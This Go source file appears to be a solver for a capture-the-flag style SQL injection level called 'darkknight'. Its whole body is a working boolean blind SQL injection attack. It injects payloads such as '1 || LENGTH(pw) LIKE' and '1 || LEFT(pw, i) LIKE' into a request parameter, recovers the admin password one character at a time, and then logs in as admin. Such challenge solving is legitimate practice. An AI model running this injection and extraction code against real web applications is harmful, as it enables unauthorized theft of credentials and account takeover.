package problem

import (
	"fmt"
	"strconv"
	"strings"
)

func find_len4(file, session string) int{
	for length := 0 ; length < 50; length += 1 {
		s_pw := "1 || LENGTH(pw) LIKE " + strconv.Itoa(length)
		param := map[string]string{
			"pw" : "1",
			"no" : s_pw,
		}
		
		contents := connect(file, param, session)
		if strings.Contains(string(contents),"<h2>Hello admin</h2>"){
			return length
		}
	}
	return 0
}

func find_pw4(file string, length int, session string)string{
	result := ""
	NEXT_STR:
	for i := 1 ; i <= length; i += 1 {
		url_str := "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
		for j :=0 ; j< len(url_str); j += 1 {
			s_pw := "1 || LEFT(pw, " + strconv.Itoa(i) + ") LIKE \"" + result + string(url_str[j]) +"\""
			param := map[string]string{
				"pw" : "1",
				"no" : s_pw,
			}
			
			contents := connect(file, param, session)
			if strings.Contains(string(contents),"<h2>Hello admin</h2>"){
				result += string(url_str[j])
				continue NEXT_STR
			}
		}
	}
	return result
}

func Darkknight(session string){
	file := "darkknight_141d7d5d93452a2e1f8c1ab8ecb81a92.php"
	
	length := find_len4(file, session)
	//fmt.Println("Key length is "+ strconv.Itoa(length) + ".")
	
	pw_str := find_pw4(file,length, session)
	//fmt.Println("pw is "+ pw_str + ".")

	param := map[string]string{
		"pw" : pw_str,
		"no" : "1 || id like \"admin\"",
	}
	
	contents := connect(file, param, session)
	if strings.Contains(string(contents),"DARKKNIGHT Clear!"){
		fmt.Println("DARKKNIGHT Clear!")
	}
}